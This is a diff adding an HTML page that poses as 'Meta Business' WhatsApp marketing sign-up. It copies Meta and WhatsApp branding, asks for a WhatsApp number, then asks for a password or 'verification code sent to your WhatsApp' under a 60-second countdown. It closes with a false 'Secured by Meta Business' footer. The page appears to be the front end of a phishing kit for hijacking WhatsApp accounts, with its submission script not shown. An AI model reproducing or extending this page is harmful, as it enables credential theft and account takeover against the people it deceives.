@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Business - WhatsApp Marketing</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Background Animation -->
+    <div class="bg-animation">
+        <div class="bg-circle circle-1"></div>
+        <div class="bg-circle circle-2"></div>
+        <div class="bg-circle circle-3"></div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="main-container">
+
+        <!-- Logo Section -->
+        <div class="logo-section">
+            <div class="logo">
+                <i class="fab fa-meta"></i>
+            </div>
+            <h1 class="brand-name">Meta Business</h1>
+            <p class="tagline">WhatsApp Marketing Solutions</p>
+        </div>
+
+        <!-- Step 1: Phone Number Input -->
+        <div class="card" id="step1">
+            <div class="card-header">
+                <div class="step-badge">Step 1 of 2</div>
+                <h2><i class="fab fa-whatsapp"></i> Enter Your WhatsApp Number</h2>
+                <p>Join our exclusive business community</p>
+            </div>
+
+            <div class="input-group">
+                <div class="phone-input-wrapper">
+                    <span class="country-code">+91</span>
+                    <input 
+                        type="tel" 
+                        id="phoneInput" 
+                        placeholder="Enter your WhatsApp number"
+                        maxlength="10"
+                        autocomplete="off"
+                    >
+                </div>
+                <div class="error-msg" id="phoneError"></div>
+            </div>
+
+            <button class="btn-primary" id="sendBtn" onclick="submitPhone()">
+                <span class="btn-text">Send <i class="fas fa-paper-plane"></i></span>
+                <span class="btn-loader">
+                    <i class="fas fa-spinner fa-spin"></i> Sending...
+                </span>
+            </button>
+        </div>
+
+        <!-- Step 2: Password Input with Timer -->
+        <div class="card hidden" id="step2">
+            <div class="card-header">
+                <div class="step-badge">Step 2 of 2</div>
+                <h2><i class="fas fa-lock"></i> Enter Your Password</h2>
+                <p>Verification code sent to your WhatsApp</p>
+            </div>
+
+            <!-- Timer -->
+            <div class="timer-container">
+                <div class="timer-circle">
+                    <svg viewBox="0 0 100 100">
+                        <circle class="timer-bg" cx="50" cy="50" r="45"></circle>
+                        <circle class="timer-progress" id="timerProgress" cx="50" cy="50" r="45"></circle>
+                    </svg>
+                    <div class="timer-text">
+                        <span id="timerDisplay">60</span>
+                        <small>seconds</small>
+                    </div>
+                </div>
+                <p class="timer-label">Enter password before time runs out</p>
+            </div>
+
+            <div class="input-group">
+                <div class="password-input-wrapper">
+                    <i class="fas fa-key input-icon"></i>
+                    <input 
+                        type="password" 
+                        id="passwordInput" 
+                        placeholder="Enter your password"
+                        autocomplete="off"
+                    >
+                    <button class="toggle-password" onclick="togglePassword()">
+                        <i class="fas fa-eye" id="eyeIcon"></i>
+                    </button>
+                </div>
+                <div class="error-msg" id="passwordError"></div>
+            </div>
+
+            <button class="btn-primary" id="verifyBtn" onclick="submitPassword()">
+                <span class="btn-text">Verify <i class="fas fa-check-circle"></i></span>
+                <span class="btn-loader">
+                    <i class="fas fa-spinner fa-spin"></i> Verifying...
+                </span>
+            </button>
+        </div>
+
+        <!-- Success Banner -->
+        <div class="card hidden" id="successBanner">
+            <div class="success-animation">
+                <div class="checkmark">
+                    <i class="fas fa-check"></i>
+                </div>
+                <div class="success-pulse"></div>
+            </div>
+
+            <h2 class="success-title">Thank You!</h2>
+            <p class="success-message">
+                <i class="fas fa-clock"></i>
+                Please wait, we will contact you within <strong>5 minutes</strong> on WhatsApp
+            </p>
+
+            <div class="contact-info">
+                <div class="info-item">
+                    <i class="fab fa-whatsapp"></i>
+                    <span>WhatsApp Verification</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Secure Process</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-users"></i>
+                    <span>Community Access</span>
+                </div>
+            </div>
+
+            <div class="countdown-banner">
+                <i class="fas fa-hourglass-half"></i>
+                <span>Expected response time: <strong id="responseTimer">05:00</strong></span>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p><i class="fas fa-shield-alt"></i> Secured by Meta Business</p>
+            <p class="copyright">© 2026 Meta Business. All rights reserved.</p>
+        </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div class="toast" id="toast">
+        <i class="fas fa-info-circle"></i>
+        <span id="toastMessage"></span>
+    </div>
+
+    <script src="js/app.js"></script>
+</body>
+</html>
